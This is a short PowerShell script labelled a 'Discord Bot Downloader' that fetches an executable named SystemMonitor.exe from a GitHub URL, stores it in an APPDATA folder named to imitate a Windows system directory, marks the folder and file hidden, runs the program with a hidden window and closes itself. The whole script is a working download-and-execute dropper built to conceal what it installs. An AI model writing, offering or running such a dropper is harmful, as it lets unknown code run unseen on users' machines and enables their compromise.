# Simple Discord Bot Downloader - Auto closes when done
# Downloads EXE from GitHub, saves to hidden location, runs it, and closes

$GitHubUrl = "https://github.com/EncryptedByRollerV8/n/raw/main/SystemMonitor.exe"
$HiddenFolder = "$env:APPDATA\Microsoft\Windows\System32Cache"
$BotExe = "SystemMonitor.exe"

try {
    # Create hidden folder
    if (!(Test-Path $HiddenFolder)) {
        New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null
    }
    
    # Download the EXE
    Write-Host "Downloading bot from GitHub..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $GitHubUrl -OutFile "$HiddenFolder\$BotExe"
    
    # Hide the folder and file
    attrib +h "$HiddenFolder" /s /d
    attrib +h "$HiddenFolder\$BotExe"
    
    # Run the EXE
    Write-Host "Starting bot..." -ForegroundColor Green
    Start-Process -FilePath "$HiddenFolder\$BotExe" -WindowStyle Hidden
    
    Write-Host "Bot is now running! Closing..." -ForegroundColor Green
    
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}

# Close PowerShell window
Stop-Process -Id $PID
